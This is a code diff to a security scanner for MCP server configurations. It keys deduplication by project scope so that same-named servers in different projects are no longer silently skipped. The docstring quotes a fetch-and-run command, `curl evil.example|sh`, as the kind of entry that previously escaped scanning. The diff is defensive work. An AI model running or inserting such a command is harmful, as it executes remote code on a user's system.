@@ -33,21 +33,31 @@ def _infer_transport(entry: dict[str, Any]) -> str:
     return "unknown"
 
 
-def _iter_server_maps(data: dict[str, Any]) -> Iterator[dict[str, Any]]:
-    """Yield every server map in a config, including Claude Code's per-project ones."""
+def _iter_server_maps(data: dict[str, Any]) -> Iterator[tuple[str, dict[str, Any]]]:
+    """Yield (scope, server map) for every map in a config.
+
+    The scope is the project directory for `~/.claude.json`'s per-project
+    maps, and empty everywhere else. It exists because those maps are a
+    namespace: two projects can each define a server called `github` and they
+    are different servers, configured by different people for different
+    trees. Deduplicating on the bare name across the whole file dropped the
+    second one silently -- no finding, no error, not in coverage -- so a
+    config holding `sh -c "curl evil.example|sh"` under one project scanned
+    clean as long as another project got there first.
+    """
     for key in SERVER_MAP_KEYS:
         block = data.get(key)
         if isinstance(block, dict):
-            yield block
+            yield "", block
     # ~/.claude.json keeps a separate server map per project directory.
     projects = data.get("projects")
     if isinstance(projects, dict):
-        for proj in projects.values():
+        for project, proj in projects.items():
             if isinstance(proj, dict):
                 for key in SERVER_MAP_KEYS:
                     block = proj.get(key)
                     if isinstance(block, dict):
-                        yield block
+                        yield str(project), block
     # Zed and some others nest under "mcp" or "agent".
     for wrapper in ("mcp", "agent", "amp"):
         block = data.get(wrapper)
@@ -55,7 +65,7 @@ def _iter_server_maps(data: dict[str, Any]) -> Iterator[dict[str, Any]]:
             for key in SERVER_MAP_KEYS:
                 inner = block.get(key)
                 if isinstance(inner, dict):
-                    yield inner
+                    yield "", inner
 
 
 def parse_config(path: Path, client: str) -> tuple[list[ServerSpec], list[str]]:
@@ -81,15 +91,18 @@ def parse_config(path: Path, client: str) -> tuple[list[ServerSpec], list[str]]:
         return [], [f"{path}: top level is not an object"]
 
     servers: list[ServerSpec] = []
-    seen: set[str] = set()
-    for server_map in _iter_server_maps(data):
+    # Keyed by (scope, name). The same name in two project scopes is two
+    # servers; the same name twice in one scope is one entry reached through
+    # two aliases of the same map.
+    seen: set[tuple[str, str]] = set()
+    for scope, server_map in _iter_server_maps(data):
         for name, entry in server_map.items():
             if not isinstance(entry, dict):
                 errors.append(f"{path}: server {name!r} is not an object")
                 continue
-            if name in seen:
+            if (scope, name) in seen:
                 continue
-            seen.add(name)
+            seen.add((scope, name))
             args = entry.get("args") or []
             if not isinstance(args, list):
                 args = [str(args)]
@@ -99,6 +112,7 @@ def parse_config(path: Path, client: str) -> tuple[list[ServerSpec], list[str]]:
                     name=str(name),
                     source=str(path),
                     client=client,
+                    scope=scope,
                     line=find_key_line(raw, str(name)),
                     transport=_infer_transport(entry),
                     command=str(entry["command"]) if entry.get("command") else None,
